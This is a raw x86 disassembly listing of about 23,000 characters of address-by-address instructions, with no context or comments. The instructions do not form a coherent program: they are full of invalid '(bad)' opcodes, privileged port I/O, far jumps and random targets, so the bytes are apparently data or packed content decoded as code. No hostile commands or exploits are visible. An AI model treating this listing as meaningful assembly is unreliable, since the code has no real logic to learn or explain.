  41281e:	aad    0x52
  412820:	or     ecx,edi
  412822:	push   ebx
  412823:	jp     0x41280e
  412825:	mov    ebp,0x6712237
  41282a:	push   0x89aabbc5
  41282f:	adc    BYTE PTR [ecx+0x11d87ce2],ch
  412835:	sub    al,0x77
  412837:	daa    
  412838:	adc    ecx,0xf3c87f82
  41283e:	fwait
  41283f:	jecxz  0x41282f
  412841:	(bad)  
  412842:	jns    0x412869
  412844:	xlat   BYTE PTR ds:[ebx]
  412845:	fdivr  DWORD PTR [eax+0x61]
  412848:	fist   DWORD PTR ds:0xbe823c2e
  41284e:	or     DWORD PTR [ebx],0xa49e07fa
  412854:	repz cdq 
  412856:	or     DWORD PTR [ebp+0x58],esp
  412859:	rcr    edi,0x17
  41285c:	fiadd  DWORD PTR [edi]
  41285e:	jno    0x412841
  412860:	jg     0x4128d7
  412862:	push   0xffffffd8
  412864:	adc    al,0x51
  412866:	fbld   TBYTE PTR es:[edi+0x2c290d3f]
  41286d:	dec    ebx
  41286e:	fsub   QWORD PTR [ebx]
  412870:	sub    eax,0xba1ae7dc
  412875:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412876:	out    dx,eax
  412877:	sti    
  412878:	jp     0x4128da
  41287a:	adc    ch,0x39
  41287d:	ins    DWORD PTR es:[edi],dx
  41287e:	push   0x5c0e3351
  412883:	mov    ebp,0x2c64fbc1
  412888:	outs   dx,DWORD PTR ds:[esi]
  412889:	dec    edi
  41288a:	cmp    ebx,esp
  41288c:	and    DWORD PTR [ecx],ebx
  41288e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41288f:	push   esp
  412890:	icebp  
  412891:	xchg   ebp,eax
  412892:	mov    esp,edi
  412894:	popf   
  412895:	dec    edi
  412896:	adc    ebp,esi
  412898:	jae    0x412861
  41289a:	sub    DWORD PTR [ecx],ebx
  41289c:	fiadd  DWORD PTR [ebp+eax*1+0x17e42a68]
  4128a3:	lods   eax,DWORD PTR ds:[esi]
  4128a4:	data16 shl BYTE PTR [ebx-0x19],cl
  4128a8:	sbb    ah,BYTE PTR [eax+0x37]
  4128ab:	mov    ebp,0x23939e14
  4128b0:	mov    DWORD PTR [ecx-0x1e92ede1],esp
  4128b6:	pop    esi
  4128b7:	push   ebx
  4128b8:	jecxz  0x412879
  4128ba:	mov    cl,0x5b
  4128bc:	mov    eax,ds:0x6c5aa50f
  4128c1:	mov    BYTE PTR [esi],cl
  4128c3:	call   0xb8163568
  4128c8:	dec    ebx
  4128c9:	or     al,0x9c
  4128cb:	dec    esi
  4128cc:	stos   DWORD PTR es:[edi],eax
  4128cd:	jmp    0x65b6:0xc191884a
  4128d4:	aad    0xaa
  4128d6:	jb     0x412885
  4128d8:	mov    ch,0x6e
  4128da:	mov    BYTE PTR [ecx],dh
  4128dc:	(bad)  
  4128dd:	repz jmp 0x41287d
  4128e0:	sub    al,0x42
  4128e2:	mov    cl,0xbd
  4128e4:	mov    bl,0xd7
  4128e6:	jno    0x412921
  4128e8:	das    
  4128e9:	cmc    
  4128ea:	je     0x4128f8
  4128ec:	adc    BYTE PTR [eax],0x83
  4128ef:	sub    eax,0xca260901
  4128f4:	aas    
  4128f5:	call   0x1772:0xe1ffea
  4128fc:	mov    al,ds:0x8de9ce9
  412901:	sub    bh,dh
  412903:	imul   esi,eax,0xcdd74d30
  412909:	or     BYTE PTR [esi+0x55],0xee
  41290d:	pop    ebp
  41290e:	and    al,BYTE PTR [edi]
  412910:	sub    BYTE PTR [edi-0x2b7c5d66],0x68
  412917:	mov    esp,0x2aa0d74a
  41291c:	imul   edx,DWORD PTR [ebx],0xf39b7b2d
  412922:	pop    es
  412923:	dec    esi
  412924:	and    al,0x4f
  412926:	push   cs
  412927:	sbb    esi,DWORD PTR ds:0xff317009
  41292d:	fadd   QWORD PTR [eax]
  41292f:	cmp    esp,DWORD PTR [edi]
  412931:	adc    ch,bh
  412933:	cmp    al,0x25
  412935:	(bad)  
  412936:	rcr    DWORD PTR [edx-0x35],cl
  412939:	outs   dx,DWORD PTR ds:[esi]
  41293a:	cld    
  41293b:	in     eax,dx
  41293c:	stos   BYTE PTR es:[edi],al
  41293d:	push   0xffffffb9
  41293f:	repnz test al,0x48
  412942:	push   ss
  412943:	xchg   ecx,eax
  412944:	out    dx,al
  412945:	sub    ebx,DWORD PTR [esi]
  412947:	test   DWORD PTR [ebx-0x2],edx
  41294a:	mov    dl,BYTE PTR [edi-0x63dfc527]
  412950:	sar    ah,0xe
  412953:	lods   al,BYTE PTR ds:[esi]
  412954:	fdivr  st(0),st
  412956:	push   eax
  412957:	out    dx,al
  412958:	push   ebp
  412959:	cdq    
  41295a:	jne    0x412997
  41295c:	retf   
  41295d:	dec    esi
  41295e:	das    
  41295f:	mov    es,WORD PTR [esi]
  412961:	(bad)  
  412962:	in     eax,dx
  412963:	inc    esi
  412964:	dec    eax
  412965:	rcl    dl,0xf3
  412968:	adc    al,0xd7
  41296a:	cs in  eax,dx
  41296c:	pop    ebx
  41296d:	sub    BYTE PTR [edi],ah
  41296f:	and    DWORD PTR [edx],0x1d521144
  412975:	imul   ebp,DWORD PTR [edx+0x4a2bc06b],0x251edb33
  41297f:	scas   eax,DWORD PTR es:[edi]
  412980:	shr    DWORD PTR [ecx+edx*4+0x1993a20a],cl
  412987:	and    al,0x91
  412989:	push   ecx
  41298a:	pop    ecx
  41298b:	pop    ds
  41298c:	sub    ecx,DWORD PTR [eax-0x4c]
  41298f:	add    dl,BYTE PTR [edi+0x6561a327]
  412995:	fwait
  412996:	pop    esi
  412997:	cdq    
  412998:	add    bh,BYTE PTR [edi]
  41299a:	push   ebp
  41299b:	clc    
  41299c:	jne    0x41299b
  41299e:	mov    ds:0x6821b4f2,al
  4129a3:	ret    0xf83c
  4129a6:	sbb    ah,dl
  4129a8:	(bad)  
  4129a9:	push   0x62
  4129ab:	push   ebx
  4129ac:	cmp    DWORD PTR [edi+0x1],ebx
  4129af:	scas   eax,DWORD PTR es:[edi]
  4129b0:	inc    edx
  4129b1:	fist   WORD PTR [esi-0xe]
  4129b4:	jle    0x412a10
  4129b6:	pusha  
  4129b7:	call   0x38b9:0x786d2b2e
  4129be:	repnz mov WORD PTR ds:0x99c639d9,?
  4129c5:	sub    eax,0x1ce4bb8b
  4129ca:	mov    ebp,0x2f316494
  4129cf:	mov    WORD PTR [eax],?
  4129d1:	mov    ebp,0xfcf424b1
  4129d6:	sbb    BYTE PTR [esi],ch
  4129d8:	jge    0x41295d
  4129da:	inc    ecx
  4129db:	xor    ebp,DWORD PTR [edi-0x7cbd96f5]
  4129e1:	popf   
  4129e2:	xlat   BYTE PTR ds:[ebx]
  4129e3:	cmp    ah,BYTE PTR [ebx-0x9]
  4129e6:	sub    BYTE PTR [edx+ebx*4+0x63],cl
  4129ea:	stos   BYTE PTR es:[edi],al
  4129eb:	or     edx,DWORD PTR [ebp-0x40]
  4129ee:	sbb    BYTE PTR [ecx-0x79b394f2],al
  4129f4:	loop   0x4129fa
  4129f6:	sbb    ebp,edi
  4129f8:	or     dl,ch
  4129fa:	sbb    eax,0xd8ad6c1a
  4129ff:	push   cs
  412a00:	fcomp  DWORD PTR [si+0x3b]
  412a04:	dec    esp
  412a05:	into   
  412a06:	arpl   WORD PTR [ecx+0x5b14606],ax
  412a0c:	rol    BYTE PTR [edi-0x782dcc44],0x90
  412a13:	sub    ecx,DWORD PTR [eax+eiz*8-0x62]
  412a17:	cmp    al,0x8a
  412a19:	std    
  412a1a:	jmp    0x4129a0
  412a1c:	add    al,0xb0
  412a1e:	out    0xef,eax
  412a20:	xor    edx,DWORD PTR [ecx+ecx*4-0x1fbde0bd]
  412a27:	loope  0x412a09
  412a29:	adc    al,0xa0
  412a2b:	in     eax,0x8b
  412a2d:	mov    ebx,0xfbbbef6d
  412a32:	xlat   BYTE PTR ds:[ebx]
  412a33:	das    
  412a34:	xchg   esp,eax
  412a35:	call   0xe82cf36b
  412a3a:	push   ebx
  412a3b:	mov    esi,DWORD PTR [edi]
  412a3d:	imul   esi,DWORD PTR [esi],0xffffffd8
  412a40:	jg     0x412a88
  412a42:	in     eax,dx
  412a43:	jbe    0x412a2e
  412a45:	mov    BYTE PTR [esi],bl
  412a47:	push   0xdb966796
  412a4c:	sti    
  412a4d:	mov    bl,0xe6
  412a4f:	xor    ecx,DWORD PTR [ecx]
  412a51:	out    dx,al
  412a52:	mov    dh,0xf6
  412a54:	adc    DWORD PTR ds:0x2212ea3b,edx
  412a5a:	jecxz  0x412a2f
  412a5c:	mov    dh,0xa7
  412a5e:	mov    bh,0x25
  412a60:	and    ecx,DWORD PTR [ecx]
  412a62:	xchg   edi,eax
  412a63:	jns    0x412ab6
  412a65:	bound  esp,QWORD PTR [ecx+0x42e38a2c]
  412a6b:	stos   DWORD PTR es:[edi],eax
  412a6c:	ror    BYTE PTR [edi],1
  412a6e:	inc    edx
  412a6f:	jbe    0x412a9b
  412a71:	ror    edi,1
  412a73:	mov    esp,DWORD PTR [eax-0x7e]
  412a76:	xchg   esi,eax
  412a77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a78:	ss ret 0x72f7
  412a7c:	jle    0x412a67
  412a7e:	mov    edx,0xda87793e
  412a83:	aas    
  412a84:	jmp    0x605cabdf
  412a89:	sbb    ebp,DWORD PTR [ebp+0x6099fff9]
  412a8f:	pop    ebp
  412a90:	aas    
  412a91:	std    
  412a92:	and    al,0xda
  412a94:	fnstsw WORD PTR [ebx-0x54]
  412a97:	jl     0x412a8f
  412a99:	test   al,0x10
  412a9b:	test   BYTE PTR [ebp+0x52],ch
  412a9e:	das    
  412a9f:	xlat   BYTE PTR ds:[ebx]
  412aa0:	push   ebp
  412aa1:	or     al,0xe
  412aa3:	pop    ecx
  412aa4:	clc    
  412aa5:	ja     0x412a51
  412aa7:	xor    eax,DWORD PTR [edx]
  412aa9:	retf   0xb50a
  412aac:	stos   BYTE PTR es:[edi],al
  412aad:	mov    dh,0xbc
  412aaf:	lods   eax,DWORD PTR ds:[esi]
  412ab0:	stos   BYTE PTR es:[edi],al
  412ab1:	loope  0x412b0c
  412ab3:	sti    
  412ab4:	push   cs
  412ab5:	jmp    0x412ae2
  412ab7:	and    eax,0x302d8b4c
  412abc:	popf   
  412abd:	daa    
  412abe:	push   ecx
  412abf:	dec    esp
  412ac0:	mov    esp,0x9bf0b7a2
  412ac5:	(bad)  
  412ac6:	jne    0x412b2d
  412ac8:	push   esi
  412ac9:	repz div DWORD PTR cs:[ebp+0x45]
  412ace:	call   0x6e18:0x258734f1
  412ad5:	add    cl,BYTE PTR gs:[ebx]
  412ad8:	xor    DWORD PTR [edi+eiz*2],eax
  412adb:	mov    bh,0xd3
  412add:	dec    ebp
  412ade:	cmp    edi,edx
  412ae0:	test   DWORD PTR [eax],esp
  412ae2:	inc    ebp
  412ae3:	data16 ror BYTE PTR [ecx-0x23b3c64a],0x2d
  412aeb:	add    ch,ch
  412aed:	int3   
  412aee:	imul   edi,DWORD PTR [esi],0xffffff94
  412af1:	loope  0x412a98
  412af3:	cld    
  412af4:	mov    al,BYTE PTR [ecx+0x70761cdf]
  412afa:	test   al,0x9a
  412afc:	mov    dh,0x42
  412afe:	add    eax,0x859419fa
  412b03:	pop    edx
  412b04:	mov    esp,eax
  412b06:	popf   
  412b07:	lea    ecx,[edi+0x1a]
  412b0a:	out    0xba,eax
  412b0c:	popf   
  412b0d:	xchg   ebp,eax
  412b0e:	cmp    al,0x5d
  412b10:	loop   0x412b46
  412b12:	test   bl,al
  412b14:	retf   0xb82a
  412b17:	into   
  412b18:	pop    ecx
  412b19:	data16 js 0x412abe
  412b1c:	call   0xef0ab78
  412b21:	nop
  412b22:	or     BYTE PTR [ebx],cl
  412b24:	ja     0x412ace
  412b26:	mov    ebx,0xcfd2dac8
  412b2b:	addr16 mov ds:0x3680,al
  412b2f:	or     BYTE PTR [esp+ecx*8-0x5a5142bf],al
  412b36:	dec    ecx
  412b37:	div    BYTE PTR [edi-0x35]
  412b3a:	xchg   ecx,eax
  412b3b:	and    bh,BYTE PTR [edi]
  412b3d:	out    0x27,eax
  412b3f:	into   
  412b40:	test   DWORD PTR [ebp-0x4df08809],ebx
  412b46:	lds    edx,FWORD PTR [ebx-0xc]
  412b49:	jmp    0xdeea:0xbacc73a8
  412b50:	add    eax,0xb175901d
  412b55:	les    esp,FWORD PTR [ebx+ebp*4+0xf]
  412b59:	and    al,0xa0
  412b5b:	(bad)  
  412b5d:	push   0x65
  412b5f:	mov    ebx,0xa4d0ee03
  412b64:	mov    eax,0xde0a932a
  412b69:	clc    
  412b6a:	mov    cl,0x23
  412b6c:	or     ebp,DWORD PTR [ecx]
  412b6e:	cmp    BYTE PTR [ebx-0x67],bh
  412b71:	jbe    0x412b67
  412b73:	in     eax,0x1b
  412b75:	sahf   
  412b76:	and    DWORD PTR [ebx],ebx
  412b78:	push   ds
  412b79:	add    DWORD PTR [ebx+ebp*2-0x54],edi
  412b7d:	xor    al,0x75
  412b7f:	loope  0x412b59
  412b81:	jbe    0x412ba8
  412b83:	xor    al,0xca
  412b85:	sub    ch,bh
  412b87:	dec    ecx
  412b88:	push   es
  412b89:	dec    esi
  412b8a:	cmp    BYTE PTR [ecx-0x22861a7d],0xf2
  412b91:	push   cs
  412b92:	data16 cmps BYTE PTR ds:[si],BYTE PTR es:[di]
  412b95:	dec    esi
  412b96:	push   0x2c
  412b98:	xor    BYTE PTR [esi],0x2a
  412b9b:	inc    eax
  412b9c:	icebp  
  412b9d:	aam    0x9f
  412b9f:	pop    es
  412ba0:	or     BYTE PTR [ebp-0x681029ec],dh
  412ba6:	jnp    0x412bbb
  412ba8:	inc    ecx
  412ba9:	fdiv   DWORD PTR [ebx]
  412bab:	xor    ch,BYTE PTR [eax+0x8]
  412bae:	mov    esi,0x4e6533c
  412bb3:	jno    0x412b91
  412bb5:	mov    ecx,ebx
  412bb7:	mov    ebx,0x82f354d7
  412bbc:	fnstenv [ebp+0x146e7eca]
  412bc2:	or     eax,0x12d6b75d
  412bc7:	arpl   dx,dx
  412bc9:	out    dx,al
  412bca:	jne    0x412b90
  412bcc:	cwde   
  412bcd:	cmp    DWORD PTR ds:0xffbcada7,ebp
  412bd3:	inc    esp
  412bd4:	into   
  412bd5:	loop   0x412c31
  412bd7:	es sbb eax,0xcdfbe4a9
  412bdd:	add    DWORD PTR [edx+0x378c5ddb],esi
  412be3:	mov    DWORD PTR [ecx+0x249101eb],esi
  412be9:	push   ecx
  412bea:	ins    DWORD PTR es:[edi],dx
  412beb:	in     eax,dx
  412bec:	mov    dh,0x79
  412bee:	fisub  WORD PTR [esi]
  412bf0:	mov    dh,cl
  412bf2:	xchg   edx,eax
  412bf3:	cmp    DWORD PTR [esi],ecx
  412bf5:	data16 and dl,cl
  412bf8:	pop    es
  412bf9:	pop    edx
  412bfa:	shl    DWORD PTR [edi+0x50],cl
  412bfd:	jnp    0x412c78
  412bff:	scas   eax,DWORD PTR es:[edi]
  412c00:	std    
  412c01:	mov    ah,cl
  412c03:	adc    DWORD PTR [esi+0x1e],0x124d2078
  412c0a:	es (bad) 
  412c0c:	jmp    0x4f18:0x2a856dc
  412c13:	stos   DWORD PTR es:[edi],eax
  412c14:	and    esi,DWORD PTR [ebx]
  412c16:	outs   dx,BYTE PTR ds:[esi]
  412c17:	ins    DWORD PTR es:[edi],dx
  412c18:	jnp    0x412bca
  412c1a:	mov    ah,0x86
  412c1c:	inc    edi
  412c1d:	fwait
  412c1e:	mov    al,0x70
  412c20:	int3   
  412c21:	and    al,0x9c
  412c23:	sub    edx,DWORD PTR [ebp+eax*2+0x55291d0a]
  412c2a:	fwait
  412c2b:	(bad)  
  412c2d:	das    
  412c2e:	or     eax,0xf734eaa7
  412c33:	xchg   DWORD PTR [esi+0x6f394914],eax
  412c39:	mov    ecx,0x44151936
  412c3e:	gs stc 
  412c40:	pop    esp
  412c41:	sbb    DWORD PTR [eax+0x721545d5],ebx
  412c47:	mov    ds:0xee8a3045,al
  412c4c:	add    ch,dl
  412c4e:	rcr    edi,0x5e
  412c51:	stos   BYTE PTR es:[edi],al
  412c52:	mov    esp,0x7befdbf6
  412c57:	(bad)  
  412c58:	stos   DWORD PTR es:[edi],eax
  412c59:	cmp    al,0xb9
  412c5b:	mov    ecx,0x3bf02c42
  412c60:	outs   dx,BYTE PTR ds:[esi]
  412c61:	retf   
  412c62:	fbstp  TBYTE PTR [esp+esi*8-0x4b]
  412c66:	out    0xe8,eax
  412c68:	adc    al,0x64
  412c6a:	(bad)  
  412c6b:	or     eax,0x98c9b431
  412c70:	jecxz  0x412cde
  412c72:	dec    esp
  412c73:	shr    DWORD PTR [esi-0x5a],1
  412c76:	mov    ebp,DWORD PTR [eax+0x13845b6e]
  412c7c:	mov    WORD PTR [eax+0x65061667],cs
  412c82:	inc    esi
  412c83:	loop   0x412cfb
  412c85:	cmp    BYTE PTR [ebp+0x5a],bl
  412c88:	inc    esi
  412c89:	out    dx,al
  412c8a:	xchg   ecx,eax
  412c8b:	daa    
  412c8c:	push   0x9d2d8465
  412c91:	mov    ebx,0x5e387acf
  412c96:	push   0xfffffff7
  412c98:	mov    DWORD PTR ds:0xebd713af,edx
  412c9e:	nop
  412c9f:	inc    edx
  412ca0:	ins    DWORD PTR es:[edi],dx
  412ca1:	mov    BYTE PTR [ecx-0x1fc2c57a],bh
  412ca7:	ror    DWORD PTR [edi-0x1301d5dc],cl
  412cad:	sti    
  412cae:	inc    ebp
  412caf:	hlt    
  412cb0:	adc    eax,0xfc37d3f6
  412cb5:	in     eax,0x79
  412cb7:	ss data16 aas 
  412cba:	mov    DWORD PTR ds:0xad152d3a,ecx
  412cc0:	sub    bl,BYTE PTR [eax-0x6a9c2c4a]
  412cc6:	fstp   QWORD PTR [ebp-0x46]
  412cc9:	jo     0x412c8e
  412ccb:	jae    0x412d3e
  412ccd:	lahf   
  412cce:	push   ecx
  412ccf:	lds    esi,FWORD PTR [ecx]
  412cd1:	sub    bh,BYTE PTR [esi]
  412cd3:	int3   
  412cd4:	xor    esi,DWORD PTR [ecx+0x2c9826d1]
  412cda:	jg     0x412c93
  412cdc:	adc    BYTE PTR [ebp+0x51cfda5e],bl
  412ce2:	xor    eax,esp
  412ce4:	js     0x412d56
  412ce6:	jg     0x412d3f
  412ce8:	data16 and BYTE PTR [esp+ecx*2],bl
  412cec:	mov    ah,0xbd
  412cee:	ja     0x412cad
  412cf0:	pop    ebx
  412cf1:	rcl    BYTE PTR [ecx],cl
  412cf3:	(bad)  
  412cf4:	mov    edx,0x1fb6abc0
  412cf9:	ja     0x412cca
  412cfb:	adc    al,0xe6
  412cfd:	sub    DWORD PTR [esi+0x46426445],0x7d3c5eb2
  412d07:	jno    0x412c9a
  412d09:	pop    ds
  412d0a:	popa   
  412d0b:	inc    eax
  412d0c:	push   ecx
  412d0d:	fisttp DWORD PTR [ebp-0x6b6afc81]
  412d13:	mov    ebp,0xf2b36e3a
  412d18:	fs push 0x26
  412d1b:	aas    
  412d1c:	retf   
  412d1d:	test   eax,0xbc075763
  412d22:	or     DWORD PTR cs:[edi+0x4a],esi
  412d26:	cmp    eax,0xa8e14621
  412d2b:	sbb    al,0x50
  412d2d:	xchg   edx,eax
  412d2e:	jns    0x412d81
  412d30:	add    eax,0xb0a53879
  412d35:	cmp    eax,0xec0d325a
  412d3a:	adc    eax,0xd9e5d510
  412d3f:	lods   eax,DWORD PTR ds:[esi]
  412d40:	or     BYTE PTR [edi],0xc6
  412d43:	gs ret 
  412d45:	mov    bl,0xc5
  412d47:	into   
  412d48:	into   
  412d49:	inc    ebp
  412d4a:	xchg   esi,eax
  412d4b:	adc    DWORD PTR [esi-0x45e4e82c],esp
  412d51:	xchg   esi,eax
  412d52:	mov    ebp,0xf8f6d863
  412d57:	mov    bh,0x47
  412d59:	out    0xb0,eax
  412d5b:	addr16 mov al,ds:0x225d
  412d5f:	and    eax,0xb95708ea
  412d64:	icebp  
  412d65:	xor    bl,BYTE PTR [eax+0x3c]
  412d68:	mov    DWORD PTR [ebp+0x9],edi
  412d6b:	jmp    0xd169:0x633eef9e
  412d72:	xchg   edi,eax
  412d73:	cs sub eax,0x7080db86
  412d79:	aas    
  412d7a:	lods   eax,DWORD PTR ds:[esi]
  412d7b:	mov    edx,0xd161c3d6
  412d80:	pop    ds
  412d81:	and    dl,ch
  412d83:	cmp    al,0x79
  412d85:	mov    bh,BYTE PTR [ecx]
  412d87:	and    edx,DWORD PTR [edx-0x1af9a870]
  412d8d:	ss icebp 
  412d8f:	in     eax,dx
  412d90:	(bad)  
  412d91:	cdq    
  412d92:	(bad)  
  412d93:	(bad)  
  412d94:	xchg   ebp,eax
  412d95:	ret    0x9677
  412d98:	jle    0x412ddf
  412d9a:	fild   WORD PTR [esi]
  412d9c:	mov    ah,0xc7
  412d9e:	ret    0xcbb
  412da1:	and    DWORD PTR [ecx-0x2a],esp
  412da4:	popf   
  412da5:	out    dx,al
  412da6:	mov    esi,0xb7f0053f
  412dab:	xchg   esp,eax
  412dac:	stos   DWORD PTR es:[edi],eax
  412dad:	cmp    eax,0xc7b6c7fb
  412db2:	mov    ah,0x4b
  412db4:	xor    eax,0x33d2cd86
  412db9:	lahf   
  412dba:	inc    ecx
  412dbb:	cmp    DWORD PTR [esi],esp
  412dbd:	loopne 0x412dd1
  412dbf:	rcr    DWORD PTR [ebp-0x778f3906],0x5f
  412dc6:	lods   al,BYTE PTR ds:[esi]
  412dc7:	aam    0x91
  412dc9:	fisttp QWORD PTR [edi-0x248a59b4]
  412dcf:	jge    0x412d60
  412dd1:	enter  0x57c7,0xd7
  412dd5:	je     0x412e06
  412dd7:	sbb    al,0xc6
  412dd9:	and    eax,0xf7b33917
  412dde:	loope  0x412e5d
  412de0:	xor    bl,bh
  412de2:	cwde   
  412de3:	retf   
  412de4:	nop
  412de5:	adc    BYTE PTR [eax+0x426871b3],ah
  412deb:	jmp    0x68507fa2
  412df0:	inc    edi
  412df1:	in     eax,dx
  412df2:	push   0x4dcdfba2
  412df7:	fwait
  412df8:	mov    ebp,0xb7251e42
  412dfd:	ins    DWORD PTR es:[edi],dx
  412dfe:	hlt    
  412dff:	hlt    
  412e00:	cld    
  412e01:	xchg   ebx,eax
  412e02:	das    
  412e03:	xchg   ecx,eax
  412e04:	outs   dx,BYTE PTR ds:[esi]
  412e05:	sbb    DWORD PTR [esi],ebp
  412e07:	add    bl,bl
  412e09:	loop   0x412e32
  412e0b:	lods   al,BYTE PTR ds:[esi]
  412e0c:	ins    DWORD PTR es:[edi],dx
  412e0d:	icebp  
  412e0e:	sub    al,0xac
  412e10:	lds    edi,FWORD PTR [edi]
  412e12:	test   ebp,esp
  412e14:	pop    eax
  412e15:	push   ds
  412e16:	icebp  
  412e17:	shr    DWORD PTR [edx],1
  412e19:	out    0x84,al
  412e1b:	push   esi
  412e1c:	sbb    esi,DWORD PTR ds:0x932ae493
  412e22:	(bad)  
  412e23:	fild   QWORD PTR [ebp+0x35f4294e]
  412e29:	mov    bl,0x50
  412e2b:	pop    ebp
  412e2c:	add    DWORD PTR [edx+0x20599508],ebp
  412e32:	ja     0x412e7a
  412e34:	pop    esi
  412e35:	adc    eax,0xb86edef8
  412e3a:	dec    esi
  412e3b:	es dec ebx
  412e3d:	lods   eax,DWORD PTR ds:[esi]
  412e3e:	mov    DWORD PTR [edx+0x3f],ebp
  412e41:	jns    0x412e42
  412e43:	xchg   BYTE PTR [edi-0x9],cl
  412e46:	or     eax,0xa8cc63f
  412e4b:	dec    ecx
  412e4c:	cmp    eax,0xacdffac4
  412e51:	cdq    
  412e52:	test   DWORD PTR ds:0xad6ec9fc,ecx
  412e58:	mov    eax,ds:0xe830e97e
  412e5d:	add    eax,0xfe4cadcf
  412e62:	push   es
  412e63:	mov    dh,0xa2
  412e65:	cmc    
  412e66:	xor    ecx,esi
  412e68:	pusha  
  412e69:	push   esp
  412e6a:	jne    0x412ed6
  412e6c:	imul   ebp,esp,0x1a
  412e6f:	jg     0x412ee2
  412e71:	int3   
  412e72:	dec    ecx
  412e73:	not    DWORD PTR [eax-0x16444643]
  412e79:	xor    edx,DWORD PTR [ebp-0x599d3788]
  412e7f:	popa   
  412e80:	mov    ecx,0x1e2d96aa
  412e85:	add    eax,ecx
  412e87:	push   eax
  412e88:	jnp    0x412e3b
  412e8a:	mul    DWORD PTR [eax+0x46a66f1f]
  412e90:	aad    0x18
  412e92:	in     eax,dx
  412e93:	sbb    al,0xa7
  412e95:	daa    
  412e96:	pop    ebx
  412e97:	loop   0x412eb3
  412e99:	and    esp,DWORD PTR gs:[eax-0x5c]
  412e9d:	es test al,0xf1
  412ea0:	ins    DWORD PTR es:[edi],dx
  412ea1:	les    ebp,FWORD PTR [edi+ebp*2+0x2f5d87c6]
  412ea8:	aaa    
  412ea9:	cdq    
  412eaa:	adc    esp,DWORD PTR [esi+edx*4+0xdea02c8]
  412eb1:	mov    ebp,0x8a2717d9
  412eb6:	xor    eax,0x5b40e59d
  412ebb:	push   ecx
  412ebc:	adc    esi,DWORD PTR [ebx+eiz*8-0x3e67c245]
  412ec3:	pop    ebp
  412ec4:	xchg   esp,eax
  412ec5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ec6:	or     BYTE PTR [esi],al
  412ec8:	pop    eax
  412ec9:	ins    BYTE PTR es:[edi],dx
  412eca:	jne    0x412e9d
  412ecc:	or     al,0x3a
  412ece:	stos   BYTE PTR es:[edi],al
  412ecf:	pop    ecx
  412ed0:	in     al,0x40
  412ed2:	call   0xf18:0x8945
  412ed8:	ficomp WORD PTR [edi+0x577d4ae]
  412ede:	push   ecx
  412edf:	add    DWORD PTR gs:[edx+0x495cc50b],esi
  412ee6:	int3   
  412ee7:	jae    0x412f2a
  412ee9:	or     DWORD PTR [esi+0x2730af11],ebp
  412eef:	sub    eax,0x2923751c
  412ef4:	xlat   BYTE PTR ds:[ebx]
  412ef5:	scas   al,BYTE PTR es:[edi]
  412ef6:	cwde   
  412ef7:	add    eax,0x4e29fafd
  412efc:	int    0xeb
  412efe:	jl     0x412e8e
  412f00:	imul   esp,DWORD PTR [edi],0x9f3c1f45
  412f06:	cdq    
  412f07:	sar    DWORD PTR [ebx+0x51bfe9b2],cl
  412f0d:	xchg   ebp,eax
  412f0e:	dec    ecx
  412f0f:	pop    edi
  412f10:	je     0x412ea2
  412f12:	cmp    eax,0xaa7d2661
  412f17:	inc    ecx
  412f18:	lods   al,BYTE PTR ds:[esi]
  412f19:	dec    ebp
  412f1a:	ficom  WORD PTR [eax+edx*1]
  412f1d:	test   eax,0x8296c750
  412f22:	sbb    DWORD PTR [ecx-0x3135aeb],ebx
  412f28:	data16 ja 0x412f7b
  412f2b:	retf   0xe8d
  412f2e:	or     BYTE PTR [esi+0xd107211],bh
  412f34:	lock push ecx
  412f36:	sar    BYTE PTR [ebx+0x22a1fcaf],0x7b
  412f3d:	adc    ecx,edi
  412f3f:	cs cdq 
  412f41:	jp     0x412f48
  412f43:	std    
  412f44:	into   
  412f45:	dec    eax
  412f46:	loopne 0x412f57
  412f48:	mov    cl,0x62
  412f4a:	mov    ds:0x97dba030,al
  412f4f:	aaa    
  412f50:	sub    esp,DWORD PTR [edx+eiz*1+0x62]
  412f54:	lahf   
  412f55:	cmc    
  412f56:	mov    dh,0xa5
  412f58:	popf   
  412f59:	aaa    
  412f5a:	test   al,al
  412f5c:	test   DWORD PTR [edi],ecx
  412f5e:	add    DWORD PTR [edx-0x6a02d069],esi
  412f64:	inc    esp
  412f65:	cdq    
  412f66:	inc    eax
  412f67:	inc    edx
  412f68:	dec    edx
  412f69:	cld    
  412f6a:	test   al,0xa1
  412f6c:	loopne 0x412fe7
  412f6e:	lods   al,BYTE PTR ds:[esi]
  412f6f:	dec    ebp
  412f70:	loop   0x412efd
  412f72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f73:	in     eax,0x60
  412f75:	cmp    ebx,esi
  412f77:	test   DWORD PTR [ebx],esi
  412f79:	dec    edi
  412f7a:	fisubr WORD PTR [ecx+0x663a97a5]
  412f80:	jle    0x412fe4
  412f82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f83:	std    
  412f84:	inc    edx
  412f85:	adc    BYTE PTR [ecx+esi*2-0x5bdc26a6],bl
  412f8c:	stos   DWORD PTR es:[edi],eax
  412f8d:	sub    eax,0xf69b53d6
  412f92:	pop    ebx
  412f93:	sahf   
  412f94:	sar    DWORD PTR [edi-0x4d],cl
  412f97:	push   0xffffff80
  412f99:	shl    BYTE PTR [ebx],0x9e
  412f9c:	sub    eax,0x522be628
  412fa1:	cmp    BYTE PTR [edx],0x13
  412fa4:	cli    
  412fa5:	sti    
  412fa6:	leave  
  412fa7:	inc    edi
  412fa8:	retf   
  412fa9:	ins    DWORD PTR es:[edi],dx
  412faa:	int3   
  412fab:	retf   
  412fac:	jle    0x412f39
  412fae:	les    edi,FWORD PTR ds:0x5569b0fc
  412fb4:	xchg   esi,eax
  412fb5:	fwait
  412fb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412fb7:	mov    DWORD PTR [ebx+0x11],ecx
  412fba:	popa   
  412fbb:	pop    ebx
  412fbc:	xchg   ebx,eax
  412fbd:	push   eax
  412fbe:	mov    bl,BYTE PTR [ebx-0x64]
  412fc1:	mov    ah,0x68
  412fc3:	mov    ebx,edi
  412fc5:	inc    esp
  412fc6:	xor    eax,eax
  412fc8:	shr    bh,cl
  412fca:	or     edi,esp
  412fcc:	dec    ecx
  412fcd:	cmp    edi,DWORD PTR [ebp+0x613084f6]
  412fd3:	mov    ds:0xe2ca8e1c,al
  412fd8:	jmp    0x412f8d
  412fda:	stos   BYTE PTR es:[edi],al
